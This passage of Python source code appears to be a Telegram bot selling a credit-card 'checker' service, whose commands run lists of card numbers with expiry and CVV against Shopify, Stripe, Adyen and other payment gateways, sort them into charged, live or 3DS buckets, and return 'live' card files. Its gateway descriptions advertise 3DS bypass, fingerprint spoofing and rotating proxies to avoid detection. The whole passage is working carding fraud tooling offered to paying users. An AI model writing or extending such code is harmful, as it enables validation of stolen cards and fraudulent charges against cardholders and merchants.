        f"[≡] {head('Channel')} » {body(CHANNEL_LINK)} » {pick(LINK_POOL)}\n"
        f"[≡] {head('Group')}   » {body(GROUP_LINK)} » {pick(LINK_POOL)}\n"
        f"</code>"
    )
    kb = {"inline_keyboard": [
        [
            {"text": "Join Channel", "url": CHANNEL_LINK,
             "icon_custom_emoji_id": _btn_icon(FIRE_POOL), "style": "primary"},
            {"text": "Join Group", "url": GROUP_LINK,
             "icon_custom_emoji_id": _btn_icon(HEART_POOL), "style": "primary"},
        ],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}],
    ]}
    try: await safe_edit(callback.message, text, reply_markup=kb)
    except Exception: pass


@router.callback_query(F.data == "menu_profile")
async def cb_menu_profile(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    display = callback.from_user.full_name or "Unknown"
    handle = f"@{callback.from_user.username}" if callback.from_user.username else "—"
    proxies = get_user_proxies(uid); count = len(proxies)
    try:
        role = auth.get_user_role(uid); expiry = auth.get_premium_expiry(uid)
    except Exception: role, expiry = "free", "N/A"
    plan = {"owner": "Owner", "admin": "Admin"}.get(role,
              f"Premium ({expiry})" if role == "premium" else "Free")
    proxy_line = f"{digit(str(count))} {body('proxies')}" if proxies else body("Not Set")
    proxy_emoji = pick(STAR_POOL) if proxies else pick(CROSS_POOL)
    text = (
        f"<code>[≡] {head('Profile')} » {head('User Info')} » {pick(CROWN_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Name')}    » {body(display)} » {pick(HEART_POOL)}\n"
        f"[≡] {head('Handle')}  » {body(handle)} » {pick(LINK_POOL)}\n"
        f"[≡] {head('ID')}      » {digit(str(uid))} » {pick(GEM_POOL)}\n\n"
        f"[≡] {head('Role')}    » {body(plan)} » {pick(STAR_POOL)}\n"
        f"[≡] {head('Expires')} » {digit(expiry) if expiry != 'N/A' else body('—')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Proxies')} » {proxy_line} » {proxy_emoji}\n"
        f"[≡] {head('Rank')}    » {body('Noob')} » {pick(CHECK_POOL)}\n"
        f"[≡] {head('Charged')} » {digit('0')} » {pick(GEM_POOL)}\n"
        f"</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "My Plan", "callback_data": "xd_cmd:myplan",
          "icon_custom_emoji_id": _btn_icon(GEM_POOL), "style": "success"}],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}],
    ]}
    try: await safe_edit(callback.message, text, reply_markup=kb)
    except Exception: pass


@router.callback_query(F.data == "xd_proxy_hint")
async def cb_xd_proxy_hint(callback: types.CallbackQuery):
    await callback.answer(
        "Use /setproxy host:port:user:pass\nOr /clearuserproxy to remove\n/chkproxy host:port to test",
        show_alert=True)


@router.callback_query(F.data.startswith("xd_cmd:"))
async def cb_xd_cmd_hint(callback: types.CallbackQuery):
    cmd = callback.data.split(":", 1)[1]
    hints = {
        "redeem": "Use /redeem KEY to activate your plan.",
        "myplan": "Use /myplan to see your plan.",
        "sh": "Usage: /sh cc|mm|yy|cvv",
        "msh": "Usage: /msh cc|mm|yy|cvv",
        "hit": "Usage: /hit url cc|mm|yy|cvv",
        "adyen": "Usage: /ady url cc|mm|yy|cvv",
    }
    await callback.answer(hints.get(cmd, "Unknown command."), show_alert=True)


# ── GATE INFO ───────────────────────────────────────────────────────────────
@router.callback_query(F.data.startswith("gate_info:"))
async def cb_gate_info(callback: types.CallbackQuery):
    await callback.answer()
    key = callback.data.split(":", 1)[1]
    info = next((g for g in GATES if g[0] == key), None)
    if not info: return
    gkey, title, mode, desc = info

    details = {
        "shopify": ("Shopify Payments", "$1 – $999", ["Multi-site rotation", "Auto-retry on dead",
                     "Live BIN on every check", "3DS bypass", "Mass via .txt"]),
        "stripe":  ("Stripe Checkout", "Custom per link", ["Direct charge", "3DS auto bypass",
                     "No proxy needed", "Full BIN", "Multi-card support"]),
        "adyen":   ("Adyen Checkout", "Custom per link", ["Pay-by-link", "Live 3DS",
                     "Cloudflare worker fallback", "Fingerprint spoof", "Proxy required"]),
        "payu":    ("PayU (ladnehistorie.pl)", "$1 USD", ["Auto identity per check",
                     "Full 3DS via Chrome", "Rotating proxy pool", "Status codes", "C/A/D detect"]),
        "rz":      ("Razorpay (razorpay.me)", "₹1 INR", ["Playwright automation",
                     "3DS auto-cancel", "Rotating proxy", "Region check", "pg_router handle"]),
        "pf":      ("Payflow (happyhillfarm.org)", "$5 USD", ["HTTP checker", "Fast ~15-30s",
                     "CVV2 detection", "Static proxy", "Direct charge"]),
        "pp":      ("PayPal Commerce", "$0.10 USD", ["PayPal gateway", "CVV2 detection",
                     "Insufficient detect", "Error codes (ISSUE)", "Async aiohttp"]),
        "msh":     ("Shopify Mass", "N/A", ["Reply to .txt or send cards", "Worker concurrency 50",
                     "Charged/Live/3DS buckets", "results.txt + live.txt", "error_{uid}.txt for fails"]),
    }
    gate, price, feats = details.get(gkey, ("Unknown", "-", []))
    feats_lines = "\n".join(f"[≡] {pick(CHECK_POOL)} {body(f)}" for f in feats)

    text = (
        f"<code>[≡] {head(title)} » {pick(STAR_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Gateway')} » {body(gate)} » {pick(FIRE_POOL)}\n"
        f"[≡] {head('Price')}   » {body(price)} » {pick(GEM_POOL)}\n"
        f"[≡] {head('Mode')}    » {body(mode.capitalize())} » {pick(STAR_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Features')} » {pick(STAR_POOL)}\n"
        f"{feats_lines}\n"
        f"</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "Back", "callback_data": "menu_check",
          "icon_custom_emoji_id": _btn_icon(CROSS_POOL), "style": "danger"}],
    ]}
    try: await safe_edit(callback.message, text, reply_markup=kb)
    except Exception: pass# ══════════════════════════════════════════════════════════════════════════════
#  PART 4 — Result UI (matches screenshot) + all checkers
# ══════════════════════════════════════════════════════════════════════════════

async def send_log_hit(response_text, amount, gate, checker_name):
    """Log WITHOUT image — text only, matching screenshot UI."""
    if not LOG_CHANNEL_ID: return
    try:
        msg = (
            f"<code>[≡] {head('Live Card')} » {pick(GEM_POOL)}\n"
            f"{DIV}\n\n"
            f"[≡] {head('Response')} » {body(str(response_text)[:120])} {pick(FIRE_POOL)}\n"
            f"[≡] {head('Amount')} » {body('$' + str(amount) + ' USD')} {pick(GEM_POOL)}\n"
            f"[≡] {head('Gate')} » {body(gate)}\n\n"
            f"{DIV}\n\n"
            f"[≡] {head('Checker')} » {pe(CHECKER_EMOJI_ID)} {body(checker_name)}</code>"
        )
        await bot.send_message(LOG_CHANNEL_ID, msg, disable_notification=True)
    except Exception as e: log.warning("log_hit: %s", e)


def _is_charged(resp, result=None):
    rl = (resp or "").lower()
    if any(k in rl for k in ("order_placed", "order completed", "processedreceipt",
                              "payment successful", "💎", "order placed")):
        return True
    if result and (result.get("Charged") == "True" or result.get("Code") == "ORDER_PLACED"):
        return True
    return False


def _classify(resp, result=None):
    """Returns bucket: charged / approved / 3ds / failed / declined."""
    rl = (resp or "").lower()
    for k in ("timed out","timeout","connection","proxy dead","proxy error",
              "could not resolve","ssl","unreachable","bad gateway",
              "gateway timeout","service unavailable","502","503","504",
              "site dead","cloudflare","access denied","tunnel"):
        if k in rl: return "failed"
    if _is_charged(resp, result): return "charged"
    if "otp_required" in rl or "3ds" in rl or "challenge" in rl: return "3ds"
    if any(k in rl for k in ("insufficient_funds","insufficient funds",
                              "incorrect_cvc","invalid_cvc","incorrect_cvv",
                              "invalid_cvv","incorrect_zip")):
        return "approved"
    return "declined"


def _status_label(bucket):
    return {"charged": "Charged", "approved": "Live", "3ds": "3DS",
            "declined": "Decline", "failed": "Site Error"}.get(bucket, "Unknown")


def _card_title(bucket):
    return {"charged": "Charged Card", "approved": "Live Card",
            "3ds": "3DS Card", "declined": "Decline Card",
            "failed": "Site Error Card"}.get(bucket, "Live Card")


def _result_ui(card, bucket, response, bi, gateway, price, elapsed, checker_name):
    """Build the exact result UI matching the screenshot."""
    title = _card_title(bucket)
    status_text = _status_label(bucket)

    # Header emoji per bucket
    hdr_emoji = {"charged": pick(GEM_POOL), "approved": pick(GEM_POOL),
                 "3ds": pick(CHECK_POOL), "declined": pick(CROSS_POOL),
                 "failed": pick(SKULL_POOL)}.get(bucket, pick(GEM_POOL))
    # Status line emoji
    st_emoji = {"charged": pick(FIRE_POOL), "approved": pick(FIRE_POOL),
                "3ds": pick(TIME_POOL), "declined": pick(CROSS_POOL),
                "failed": pick(SKULL_POOL)}.get(bucket, pick(FIRE_POOL))

    brand = bi.get("brand") or "-"
    bin_type = bi.get("type") or "-"
    level = bi.get("level") or "-"
    bank = bi.get("bank") or "-"
    country = bi.get("country") or "-"
    flag = bi.get("flag") or ""
    country_str = f"{flag} {country}".strip() if flag else country

    resp_short = str(response or "Unknown")[:120]
    resp_code = resp_short.split()[0] if resp_short else "UNKNOWN"

    return (
        f"<code>"
        f"[≡] {head(title)} » {hdr_emoji}\n"
        f"{DIV}\n\n"
        f"[≡] {head('CC')} » {body(card)}\n"
        f"[≡] {head('Status')} » {body(status_text)} {st_emoji}\n"
        f"[≡] {head('Result')} » {body(resp_code)} {pick(FIRE_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('BIN')} » {body(f'{brand} · {bin_type} · {level}')}\n"
        f"[≡] {head('Bank')} » {body(bank)}\n"
        f"[≡] {head('Country')} » {body(country_str)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Gateway')} » {body(gateway)}\n"
        f"[≡] {head('Response')} » {body(resp_short)}\n"
        f"[≡] {head('Amount')} » {body('$' + str(price) + ' USD')} {pick(GEM_POOL)}\n"
        f"[≡] {head('Time')} » {body(f'{elapsed:.1f}s')} {pick(TIME_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Checker')} » {pe(CHECKER_EMOJI_ID)} {body(checker_name)}"
        f"</code>"
    )


def _checking_ui(card):
    return (
        f"<code>"
        f"{pick(GEM_POOL)} {bold('Checking...')}\n"
        f"💳 {bold('Card')} » <code>{card}</code>"
        f"</code>"
    )


# ── PROGRESS / FINAL UI ─────────────────────────────────────────────────────
def _fmt_elapsed(s):
    if s >= 3600:
        h = s // 3600; m = (s % 3600) // 60
        return f"{h}h {m}m"
    if s >= 60:
        m, sec = divmod(s, 60); return f"{m}m {sec}s"
    return f"{s}s"


def _progress_ui(total, checked, charged, approved, threeds, declined, elapsed):
    return (
        f"<code>"
        f"{pick(GEM_POOL)} {bold('Mass Check')} » {bold('Running')} {pick(TIME_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Checked')} » {digit(str(checked))}/{digit(str(total))}\n"
        f"[≡] {head('Charged')} » {digit(str(charged))}\n"
        f"[≡] {head('Approved')} » {digit(str(approved))}\n"
        f"[≡] {head('3DS')} » {digit(str(threeds))}\n"
        f"[≡] {head('Declined')} » {digit(str(declined))}\n"
        f"[≡] {head('Time')} » {body(_fmt_elapsed(elapsed))} {pick(TIME_POOL)}\n"
        f"</code>"
    )


def _final_summary_ui(total, charged, approved, threeds, declined, elapsed, checker_name):
    return (
        f"<code>"
        f"[≡] {head('Mass Check')} » {head('Done')} » {pick(CHECK_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Total')} » {digit(str(total))}\n"
        f"[≡] {head('Charged')} » {digit(str(charged))}\n"
        f"[≡] {head('Approved')} » {digit(str(approved))}\n"
        f"[≡] {head('3DS')} » {digit(str(threeds))}\n"
        f"[≡] {head('Declined')} » {digit(str(declined))}\n"
        f"[≡] {head('Time')} » {body(_fmt_elapsed(elapsed))} {pick(TIME_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Checker')} » {pe(CHECKER_EMOJI_ID)} {body(checker_name)}"
        f"</code>"
    )


# ── /sh ──────────────────────────────────────────────────────────────────────
@router.message(Command("sh"))
async def cmd_sh(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    cc = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc = extract_cc(args[1])
        if not cc:
            parts = re.split(r"[|/]", args[1].strip())
            if len(parts) >= 4: cc = "|".join(p.strip() for p in parts[:4])
    if not cc and message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc = extract_cc(rt)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}\n\n{bold('Usage:')} /sh 4388...|03|2030|815"); return
    proxy = get_user_proxy(uid)
    if not proxy:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxy Set!')}\n\nUse /setproxy host:port:user:pass"); return
    site = get_random_site()
    if not site:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No sites available!')}"); return
    bin_num = cc.split("|")[0][:6]
    loading = await message.reply(_checking_ui(cc))
    t0 = time.time()
    _chk = asyncio.create_task(checker_bridge.check_card_site(cc, site, proxy))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try: result = await _chk
    except Exception as e: result = {"Response": str(e)[:80], "Price": "-", "Gate": "-"}
    bi = await _bin
    elapsed = time.time() - t0
    resp = result.get("Response", "Unknown")
    bucket = _classify(resp, result)
    await safe_edit(loading, _result_ui(cc, bucket, resp, bi,
                                        result.get("Gate", "-"),
                                        str(result.get("Price", "-")),
                                        elapsed, message.from_user.full_name or "Unknown"))
    if bucket in ("charged", "approved", "3ds"):
        try: await bot.pin_chat_message(message.chat.id, loading.message_id, disable_notification=True)
        except Exception: pass
    if bucket == "charged":
        await send_log_hit(resp[:120], str(result.get("Price", "-")),
                           result.get("Gate", "-"), message.from_user.full_name or "Unknown")


# ── /msh ─────────────────────────────────────────────────────────────────────
MSH_MAX = 2000
_msh_locks = {}; _user_sems = {}

def _user_sem(uid):
    if uid not in _user_sems: _user_sems[uid] = asyncio.Semaphore(50)
    return _user_sems[uid]


async def _msh_one(cc, proxy, status_msg, results, order, user, user_id, sites, started):
    site = random.choice(sites)
    bin_num = cc.split("|")[0][:6]
    _bin = asyncio.create_task(bin_lookup(bin_num))
    t0 = time.time()
    sem = _user_sem(user_id)
    async with sem:
        try: result = await checker_bridge.check_card_site(cc, site, proxy)
        except Exception as e: result = {"Response": str(e)[:80], "Price": "-", "Gate": "-"}
    bi = await _bin
    elapsed = time.time() - t0
    results[cc] = {"result": result, "bin": bi, "elapsed": elapsed}

    mid = status_msg.message_id
    if mid not in _msh_locks: _msh_locks[mid] = asyncio.Lock()
    async with _msh_locks[mid]:
        done = sum(1 for c in order if c in results)
        total = len(order)
        counts = {"charged":0,"approved":0,"3ds":0,"declined":0,"failed":0}
        for c in order:
            if c in results:
                b = _classify(results[c]["result"].get("Response",""), results[c]["result"])
                counts[b] = counts.get(b, 0) + 1
        try:
            await safe_edit(status_msg, _progress_ui(total, done, counts["charged"],
                                                     counts["approved"], counts["3ds"],
                                                     counts["declined"] + counts["failed"],
                                                     int(time.time() - started)))
        except Exception: pass
    if sum(1 for c in order if c in results) == len(order):
        _msh_locks.pop(mid, None)

    b = _classify(results[cc]["result"].get("Response",""), results[cc]["result"])
    if b in ("charged", "approved", "3ds"):
        try:
            await bot.send_message(status_msg.chat.id,
                _result_ui(cc, b, results[cc]["result"].get("Response","Unknown"),
                           bi, results[cc]["result"].get("Gate","Unknown"),
                           str(results[cc]["result"].get("Price","-")),
                           elapsed, user.full_name or "Unknown"))
        except Exception: pass
    if b == "charged":
        await send_log_hit(results[cc]["result"].get("Response","")[:120],
                           str(results[cc]["result"].get("Price","-")),
                           results[cc]["result"].get("Gate","-"), user.full_name or "Unknown")


def _results_txt(results, order):
    buckets = {"charged": [], "approved": [], "3ds": [], "declined": [], "failed": []}
    for card in order:
        entry = results.get(card)
        if not entry: buckets["failed"].append((card, {})); continue
        r = entry["result"]
        b = _classify(r.get("Response",""), r)
        buckets[b].append((card, r))
    lines = ["="*70, "CC CHECKER RESULTS", "Format: CC | Gateway | Price | Response | Site", "="*70, ""]
    for title, icon, key in (("CHARGED","✅","charged"),("APPROVED","🔥","approved"),
                              ("3DS","⏳","3ds"),("DECLINED","❌","declined"),
                              ("FAILED","☠️","failed")):
        lines.append(f"{icon} {title} ({len(buckets[key])}):")
        lines.append("-"*70)
        for card, r in buckets[key]:
            lines.append(f"{card} | {r.get('Gate','-')} | {r.get('Price','-')} | {str(r.get('Response','-'))[:100]}")
        lines.append("")
    return "\n".join(lines)


@router.message(Command("msh"))
async def cmd_msh(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    raw = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
        # also pull from attached .txt document
        doc = message.reply_to_message.document
        if doc and doc.file_name and doc.file_name.lower().endswith(".txt"):
            try:
                buf = BytesIO(); await bot.download(doc.file_id, destination=buf)
                buf.seek(0); ft = buf.read().decode("utf-8", errors="ignore")
                raw = (raw + "\n" + ft).strip() if raw else ft
            except Exception: pass
    if not raw.strip():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /msh cc|mm|yy|cvv ... or reply to a .txt"); return
    ccs = []
    for m in CC_PATTERN.finditer(raw):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs: ccs.append(cc)
    if not ccs:
        for line in raw.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in ccs: ccs.append(cc)
    if not ccs:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid CCs found!')}"); return
    ccs = ccs[:MSH_MAX]
    proxy = get_user_proxy(uid)
    if not proxy:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxy Set!')} /setproxy"); return
    sites = _load_sites()
    if not sites:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No sites available!')}"); return
    total = len(ccs); started = time.time()
    user_name = message.from_user.full_name or "Unknown"
    status = await message.reply(_progress_ui(total, 0, 0, 0, 0, 0, 0))
    results = {}; order = list(ccs)
    await asyncio.gather(*[asyncio.create_task(
        _msh_one(c, proxy, status, results, order, message.from_user, uid, sites, started)
    ) for c in ccs], return_exceptions=True)
    elapsed = int(time.time() - started)

    charged_list, approved_list, threeds_list, declined_list, failed_list = [], [], [], [], []
    for cc in order:
        if cc not in results: failed_list.append(cc); continue
        r = results[cc]["result"]
        b = _classify(r.get("Response",""), r)
        if b == "charged": charged_list.append(cc)
        elif b == "approved": approved_list.append(cc)
        elif b == "3ds": threeds_list.append(cc)
        elif b == "declined": declined_list.append(cc)
        else: failed_list.append(cc)

    declined_total = len(declined_list)
    approved_plus_3ds = len(approved_list) + len(threeds_list)

    try: await status.delete()
    except Exception: pass

    try:
        sent = await message.reply(_final_summary_ui(
            total, len(charged_list), len(approved_list), len(threeds_list),
            declined_total + len(failed_list), elapsed, user_name))
        try: await bot.pin_chat_message(message.chat.id, sent.message_id, disable_notification=True)
        except Exception: pass
    except Exception: pass

    try:
        await bot.send_document(message.chat.id, types.BufferedInputFile(
            _results_txt(results, order).encode("utf-8"), filename="results.txt"))
    except Exception as e: log.warning("results.txt: %s", e)

    if approved_plus_3ds > 0:
        live_body = (
            f"[≡] Live Hits » Approved + 3DS » ✅\n"
            f"[≡] Approved » {len(approved_list)}\n"
            f"[≡] 3DS » {len(threeds_list)}\n\n"
            + "\n".join(approved_list + threeds_list)
        )
        try:
            await bot.send_document(message.chat.id, types.BufferedInputFile(
                live_body.encode("utf-8"), filename="live.txt"))
        except Exception as e: log.warning("live.txt: %s", e)

    if failed_list:
        err_body = f"[≡] Failed Cards » {len(failed_list)} cards » ☠️\n\n" + "\n".join(failed_list)
        try:
            await bot.send_document(message.chat.id, types.BufferedInputFile(
                err_body.encode("utf-8"), filename=f"error_{uid}.txt"))
        except Exception as e: log.warning("error_%s.txt: %s", uid, e)

    if charged_list:
        try:
            await bot.send_message(message.chat.id,
                f"{pick(GEM_POOL)} {bold('Charged hits:')} {bold(str(len(charged_list)))}\n" +
                "\n".join(f"<tg-spoiler>{c}</tg-spoiler>" for c in charged_list[:20]))
        except Exception: pass


# ── /hit ─────────────────────────────────────────────────────────────────────
HIT_MAX = 10; _hit_active = set()

@router.message(Command("hit"))
async def cmd_hit(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    if uid in _hit_active:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Stripe check already running!')}"); return
    raw = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
    if not raw.strip():
        await message.reply(f"{pick(BOLT_POOL)} {bold('Usage:')} /hit url cc|mm|yy|cvv"); return
    lm = re.search(r"https?://[^\s]*(?:checkout\.stripe\.com|billing\.stripe\.com|"
                   r"invoice\.stripe\.com|payment\.stripe\.com|pay\.stripe\.com|"
                   r"buy\.stripe\.com|cs_(?:live|test)_|plink_(?:live|test)_)[^\s]*",
                   raw, re.IGNORECASE)
    if not lm:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Stripe link found!')}"); return
    url = lm.group(0)
    ccs = []
    for m in CC_PATTERN.finditer(raw):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs: ccs.append(cc)
    if not ccs:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid CCs found!')}"); return
    ccs = ccs[:HIT_MAX]
    _hit_active.add(uid)
    total = len(ccs); results = {}; order = list(ccs)
    user_name = message.from_user.full_name or "Unknown"
    status = await message.reply(f"{pick(BOLT_POOL)} {bold('Stripe Hitter')} [0/{total}]\n\n{pick(GEM_POOL)} {bold('URL')}: {url[:55]}")
    try:
        for cc in order:
            try: result = await asyncio.get_running_loop().run_in_executor(CHECKER_POOL, hit.run_hit_check, url, cc)
            except Exception as e: result = {"ok": False, "error": str(e)[:80]}
            results[cc] = result
            rs = (result.get("result_status") or "").lower()
            if not result.get("ok"): line = f"{pick(CROSS_POOL)} {bold((result.get('error') or 'Failed')[:55])}"
            elif rs == "charged": line = f"{pick(GEM_POOL)} {bold('Charged Success')}"
            elif rs == "approved": line = f"{pick(CHECK_POOL)} {bold('Live')}"
            elif result.get("session_dead"): line = f"{pick(CROSS_POOL)} {bold('Session Dead')}"
            else: line = f"{pick(CROSS_POOL)} {bold((result.get('result_msg') or 'Declined')[:50])}"
            results[cc]["_line"] = line
            lines = [f"{pick(BOLT_POOL)} {bold('Stripe Hitter')} [{sum(1 for c in order if c in results)}/{total}]\n",
                     f"{pick(GEM_POOL)} {bold('URL')}: {url[:55]}", ""]
            for c in order:
                if c in results: lines.append(f"{results[c]['_line']}\n{pick(GEM_POOL)} <tg-spoiler>{c}</tg-spoiler>")
                else: lines.append(f"{pick(TIME_POOL)} <tg-spoiler>{c}</tg-spoiler> checking...")
            lines.append(f"\n{pick(FIRE_POOL)} {bold('Checked by')}: {user_name}")
            await safe_edit(status, "\n\n".join(lines))
            if rs == "charged":
                try: await bot.pin_chat_message(message.chat.id, status.message_id, disable_notification=True)
                except Exception: pass
                amt = result.get("amount_cents") or 0
                await send_log_hit((result.get("result_msg") or "Success")[:120],
                                   f"{int(amt)/100:.2f}" if amt else "1.00",
                                   "Stripe Checkout", user_name)
                break
            if result.get("session_dead"): break
    finally: _hit_active.discard(uid)


# ── /ady /adyen ──────────────────────────────────────────────────────────────
ADYEN_MAX = 10; _adyen_active = set()

@router.message(Command("ady", "adyen"))
async def cmd_ady(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    if uid in _adyen_active:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Adyen check already running!')}"); return
    raw = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
    if not raw.strip():
        await message.reply(f"{pick(HEART_POOL)} {bold('Usage:')} /ady url cc|mm|yy|cvv"); return
    lm = re.search(r"https?://[^\s]+adyen[^\s]+", raw, re.IGNORECASE)
    if not lm:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Adyen link found!')}"); return
    link = lm.group(0)
    ccs = []
    for m in CC_PATTERN.finditer(raw):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs: ccs.append(cc)
    if not ccs:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid CCs found!')}"); return
    ccs = ccs[:ADYEN_MAX]
    proxies = get_user_proxies(uid)
    if not proxies:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxy Set!')}\n\nAdyen requires a proxy. /setproxy host:port:user:pass"); return
    _adyen_active.add(uid)
    total = len(ccs); user_name = message.from_user.full_name or "Unknown"
    results = {}; order = list(ccs)
    status = await message.reply(f"{pick(HEART_POOL)} {bold('Adyen Hitter')} [0/{total}]")
    try:
        for cc in order:
            proxy = random.choice(proxies)
            try: r = await adyen_engine.process_payment(link, cc, proxy)
            except Exception as e: r = {"error": str(e)[:80], "cc": cc}
            ps = (r.get("payment_status") or "").lower(); err = (r.get("error") or "").lower()
            if r.get("3d_bypassed") or ps in ("authorised","received","pending"):
                line = f"{pick(GEM_POOL)} {bold('Charged / Success!')}"; is_ch = True
            elif "challenge required" in err: line = f"{pick(CHECK_POOL)} {bold('3DS Challenge — Live')}"; is_ch = False
            elif "insufficient" in ps or "insufficient" in err: line = f"{pick(CHECK_POOL)} {bold('Insufficient Funds')}"; is_ch = False
            elif "cvc" in ps or "cvc" in err: line = f"{pick(CHECK_POOL)} {bold('Incorrect CVC — Live')}"; is_ch = False
            elif ps in ("refused","cancelled","declined") or "declined" in err: line = f"{pick(CROSS_POOL)} {bold('Declined')}"; is_ch = False
            elif "not active" in err or "expired" in err: line = f"{pick(CROSS_POOL)} {bold('Expired')}"; is_ch = False
            else: line = f"{pick(SKULL_POOL)} {bold(((r.get('payment_status') or r.get('error') or 'Unknown')[:55]))}"; is_ch = False
            results[cc] = r; results[cc]["_line"] = line
            lines = [f"{pick(HEART_POOL)} {bold('Adyen Hitter')} [{sum(1 for c in order if c in results)}/{total}]\n"]
            for c in order:
                if c in results: lines.append(f"{results[c]['_line']}\n{pick(GEM_POOL)} <tg-spoiler>{c}</tg-spoiler>")
                else: lines.append(f"{pick(TIME_POOL)} <tg-spoiler>{c}</tg-spoiler> checking...")
            lines.append(f"\n{pick(FIRE_POOL)} {bold('Checked by')}: {user_name}")
            await safe_edit(status, "\n\n".join(lines))
            if is_ch:
                try: await bot.pin_chat_message(message.chat.id, status.message_id, disable_notification=True)
                except Exception: pass
                amt = r.get("amount")
                await send_log_hit((r.get("payment_status") or "Authorised"),
                                   f"{float(amt)/100:.2f}" if isinstance(amt,(int,float)) else "1.00",
                                   f"Adyen · {r.get('merchant_name') or '-'}", user_name)
                break
    finally: _adyen_active.discard(uid)


# ── PROXY ────────────────────────────────────────────────────────────────────
async def test_proxy_detailed(proxy_url):
    try:
        ok, ip_or_err, rotation = await test_proxy(proxy_url)
        return {"success": bool(ok), "error": None if ok else str(ip_or_err)[:100],
                "ip": ip_or_err if ok else None, "rotation": rotation if ok else None}
    except Exception as e:
        return {"success": False, "error": str(e)[:100]}


@router.message(Command("setproxy", "proxy"))
async def cmd_setproxy(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    raw = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2: raw = args[1]
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
        doc = message.reply_to_message.document
        if doc and doc.file_name and doc.file_name.lower().endswith(".txt"):
            try:
                buf = BytesIO(); await bot.download(doc.file_id, destination=buf)
                buf.seek(0); ft = buf.read().decode("utf-8", errors="ignore")
                raw = (raw + "\n" + ft).strip() if raw else ft
            except Exception: pass
    if not raw.strip():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')}\n\n/setproxy host:port:user:pass\n/setproxy host:port\n/setproxy socks5://user:pass@host:port"); return
    parsed, failed = [], 0
    for line in raw.strip().splitlines():
        line = line.strip()
        if not line: continue
        p = parse_proxy_format(line)
        if p: parsed.append(p)
        else: failed += 1
    if not parsed:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid proxies found!')}"); return
    need = MAX_PROXIES_PER_USER - len(get_user_proxies(uid))
    if need <= 0:
